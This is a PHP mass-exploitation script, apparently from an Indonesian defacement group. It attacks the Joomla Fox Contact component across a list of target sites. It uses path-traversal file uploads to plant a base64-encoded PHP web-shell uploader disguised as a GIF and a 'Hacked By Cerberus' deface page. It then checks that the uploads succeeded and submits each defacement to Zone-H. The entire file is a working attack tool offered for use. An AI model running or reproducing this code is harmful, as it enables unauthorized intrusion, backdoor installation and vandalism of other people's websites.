<?php
error_reporting(0);
set_time_limit(0);

Class IDX_Foxcontact {
	public  $url;
	private $file = [];

	/* Nick Hacker Kalian / Nick Zone -H Kalian */
	/* Pastikan dalam script deface kalian terdapat kata HACKED */
	private $hacker = "Cerberus";

	/* script uploader, sebaiknya jangan di otak-atik */
	private $uploader  = 'R0lGODlhOw0KPGh0bWw+DQo8dGl0bGU+VXBsb2FkZXIgQnkgSW5kb1hwbG9pdCBCT1Q8L3RpdGxlPg0KPHA+PD9waHAgZWNobyAnPGI+Jy5waHBfdW5hbWUoKS4nPC9iPic7ID8+PGJyPg0KPD9waHAgZWNobyAnPGI+Jy5nZXRjd2QoKS4nPC9iPic7ID8+PC9wPg0KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdpZHhfZmlsZSc+DQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXBsb2FkJyBuYW1lPSd1cGxvYWQnPg0KPC9mb3JtPg0KPD9waHAgaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPk9LPC9iPl0nOyB9IGVsc2UgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPkZBSUxFRDwvYj4nOyB9IH0gPz4=';
		
	/* script deface, ubah bagian ini ke base64 script deface kalian */
	private $deface    = 'PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KCTx0aXRsZT4NCgkJIX5Ccm9rZW5IZWFydH4hDQoJPC90aXRsZT4NCgk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQoJPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCI+DQoJPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IkluZG9uZXNpYW4gUGVvcGxlLCBoYWNrIi8+DQoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkhhY2tlZCBCeSBDZXJiZXJ1cyB8IEhhY2tlciBQYXRhaCBIYXRpIj4NCgk8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IkhhY2tlZCBCeSBDZXJiZXJ1cyB8IEhhY2tlciBQYXRhaCBIYXRpIj4NCgk8bWV0YSBuYW1lPSJnb29nbGVib3QiIGNvbnRlbnQ9ImFsbCxpbmRleCxmb2xsb3ciPg0KCTxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudD0iaW5kZXgsIGZvbGxvdyI+DQoJPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KCTxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQoJCWJvZHkgew0KCQkJYmFja2dyb3VuZC1pbWFnZTogdXJsKGh0dHBzOi8vYzEuc3RhdGljZmxpY2tyLmNvbS85Lzg3NDQvMTYzMjIwMTY5ODRfNzYwNGRkZWY2Y19iLmpwZyk7DQoJCQliYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KCQl9DQoJPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KCTxoMT4NCgkJPGZvbnQgY29sb3I9IndoaXRlIj4jIS9IYWNrZWQvQnkvQ2VyYmVydXM8L2ZvbnQ+PGJyPjxicj48YnI+PGJyPjxicj48YnI+DQoJCTxmb250IGNvbG9yPSJ3aGl0ZSIgc2l6ZT0iMyI+ZWNobyAiPC9mb250Pjxmb250IGNvbG9yPSJyZWQiIHNpemU9IjMiPllvdSBBcmUgTmV4dCAuLi48L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIiBzaXplPSIzIj4iPC9mb250Pjxicj4NCgkJPGZvbnQgY29sb3I9IndoaXRlIiBzaXplPSI1Ij5lY2hvICI8L2ZvbnQ+PGZvbnQgY29sb3I9InJlZCIgc2l6ZT0iNSI+V2FpdCBGb3IgbWUgVG8gQ29tZSAuLi48L2ZvbnQ+PC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSIgc2l6ZT0iNSI+IjwvZm9udD48YnI+DQoJCTxmb250IGNvbG9yPSJ3aGl0ZSI+ZWNobyAiPC9mb250Pjxmb250IGNvbG9yPSJyZWQiPlRvIFRyeSBZb3VyIFNlY3VyaXR5IFN5c3RlbSAuLi48L2ZvbnQ+PC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+IjwvZm9udD48YnI+PGJyPjxicj48YnI+PGJyPg0KCTwvaDE+DQoJPHRhYmxlIHdpZHRoPSI1MCUiPg0KCQk8dHI+DQoJCQk8dGg+PGZvbnQgY29sb3I9InJlZCI+VGhhbmtzPSI8L2ZvbnQ+PC90aD4NCgkJCTx0aD48Zm9udCBjb2xvcj0id2hpdGUiPjxtYXJxdWVlPkNlcmJlcnVzIHwgTXIuQ3IwNyB8IEtBVEVOQkFEIHwgTVIuTDQ2MDQgfCBaZXJvU3ZuIHwgUEVHQVNVUyB8IFMzY3JldCB8IFhldnVzRGVjMGRlZCB8IHN5bnRheDA0cm8gfCBEcjM0bUN5YjNyIHwgQUNINE5fNDA0IHwgUG93ZXIgUmFuZ2VyIHwgTXIuRzNOMjAzVHogfCBNci5IVFRQIHwgZEthZG94IHwgIFYxR04zIHwgQ1lCRVJTQ1JZVEVDSF8gfCBSYXltb25kNyB8IEZSMDBHNX40MDR+M3JyMFIgfCBNci5HaXQgfCBQM2p1NG5nU2VueXVtIHwgMzAxSyB8IE1yLkN0cmwgUjcgfCAuL1NwZWNpbWVudCB8IEhhY2tlciBQYXRhaCBIYXRpIHwgSW5kb1hwbG9pdCB8IEdGUy1URUFNIHwgTGluZyBMdW5nIENyZXcgfCBFWEkyVCBDeWJlciBUZWFtIHwgQ3liZXIgVHJvbiBEYXJrbmVzcyB8IEJhYmJ5IEN5YmVyIFRlYW08L2ZvbnQ+PC9tYXJxdWVlPjwvdGg+DQoJCQk8dGg+PGZvbnQgY29sb3I9InJlZCI+Ijs8L2ZvbnQ+PC90aD4NCgkJCTwvdHI+DQoJPC90YWJsZT4NCgk8cD48aWZyYW1lIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHNyYz0iaHR0cHM6Ly93d3cueW91dHViZS5jb20vZW1iZWQvTU1EVTRoaFJqUU0/cmVsPTAmYXV0b3BsYXk9MSIgZnJhbWVib3JkZXI9IjAiIGFsbG93ZnVsbHNjcmVlbj48L2lmcmFtZT4NCjwvYm9keT4NCjwvaHRtbD4=';

		 

	public function __construct() {
		$this->file = (object) $this->file;

		/* Nama file deface kalian */
		$this->file->deface 	= "broken.htm";

		$this->file->shell 		= $this->randomFileName().".php";
	}

	public function validUrl() {
		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
			$url = "http://".$this->url;
			return $url;
		} else {
			return $this->url;
		}
	}

	public function randomFileName() {
		$characters = implode("", range(0,9)).implode("", range("A","Z")).implode("", range("a","z"));
		$generate   = substr(str_shuffle($characters), 0, rand(4, 8));

		$prefixFilename = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74"."_";
		return $prefixFilename.$generate;
	}

	public function curl($url, $data = null, $headers = null, $cookie = true) {
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
			  curl_setopt($ch, CURLOPT_URL, $url);
			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		if($data !== null) {
			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			  curl_setopt($ch, CURLOPT_POST, TRUE);
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}

		if($headers !== null) {
			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($cookie === true) {
			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		}

		$exec = curl_exec($ch);
		$info = curl_getinfo($ch);

			  curl_close($ch);

		return (object) [
			"response" 	=> $exec,
			"info"		=> $info
		];

	}

	public function getId() {
		$url 		= $this->url;
		$getContent = $this->curl($url)->response;
		preg_match_all("/<a name=\"cid_(.*?)\">/", $getContent, $cid);
		preg_match_all("/<a name=\"mid_(.*?)\">/", $getContent, $mid);

		return (object) [
			"cid" => ($cid[1][0] === NULL ? 0 : $cid[1][0]),
			"mid" => ($mid[1][0] === NULL ? 0 : $mid[1][0]),
		];
	}

	public function exploit() {
		$getCid = $this->getId()->cid;
		$getMid = $this->getId()->mid;

		$url	= (object) parse_url($this->url);

		$headers = [
			"X-Requested-With: XMLHttpRequest",
			"X-File-Name: ".$this->file->shell,
			"Content-Type: image/jpeg"
		];

		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->uploader), $headers);
		}

		$shell = $url->scheme."://".$url->host."/components/com_foxcontact/".$this->file->shell;
		$check = $this->curl($shell)->response;
		if(preg_match("/Uploader By IndoXploit BOT/i", $check)) {
			print "[+] Shell OK: ".$shell."\n";
			$this->save($shell);
		} else {
			print "[-] Shell Failed\n";
		}
		
		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->deface), $headers);
		}

		$deface = $url->scheme."://".$url->host."/".$this->file->deface;
		$check = $this->curl($deface)->response;
		if(preg_match("/hacked/i", $check)) {
			print "[+] Deface OK: ".$deface."\n";
			$this->zoneh($deface);
			$this->save($deface);
		} else {
			print "[-] Deface Failed\n";
		}
	}

	public function zoneh($url) {
		$post = $this->curl("http://www.zone-h.com/notify/single", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);
		if(preg_match("/color=\"red\">(.*?)<\/font><\/li>/i", $post->response, $matches)) {
			if($matches[1] === "ERROR") {
				preg_match("/<font color=\"red\">ERROR:<br\/>(.*?)<br\/>/i", $post->response, $matches2);
				print "[-] Zone-H ($url) [ERROR: ".$matches2[1]."]\n\n";
			} else {
				print "[+] Zone-H ($url) [OK]\n\n";
			}
		}
	}

	public function save($isi) {
		$handle = fopen("result_foxcontact.txt", "a+");
		fwrite($handle, "$isi\n");
		fclose($handle);
	}
} 	

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
$open = explode("\n", file_get_contents($argv[1]));

foreach($open as $list) {
	$fox = new IDX_Foxcontact();
	$fox->url = trim($list);
	$fox->url = $fox->validUrl();

	print "[*] Exploiting ".parse_url($fox->url, PHP_URL_HOST)."\n";
	$fox->exploit();
}